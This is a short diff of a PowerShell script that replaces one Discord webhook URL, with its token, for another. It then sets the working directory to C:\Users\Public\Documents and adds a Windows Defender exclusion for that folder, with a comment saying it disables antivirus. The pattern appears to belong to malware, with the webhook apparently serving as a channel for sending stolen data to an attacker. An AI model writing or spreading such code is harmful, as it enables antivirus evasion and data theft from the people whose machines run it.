@@ -1,4 +1,4 @@
-$dc = 'https://discordapp.com/api/webhooks/1326939740376666173/ObqWii2cZjelYgJsDNrGSka_Af717jbcjE1NOPcrEHjwE1jTJlJIyVH4XjRpWFyQ99ye';
+$dc = 'https://discordapp.com/api/webhooks/1326958104461574195/XWeyHvUfeAM4m9aAuTJeYSO_sxBa5u2_XlRhb9F_bHgwJrR78ZiFYB_Ufmx35jC3o2Ns';
 Set-Location C:\Users\Public\Documents
 
 Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents' # Disabling antivirus activation
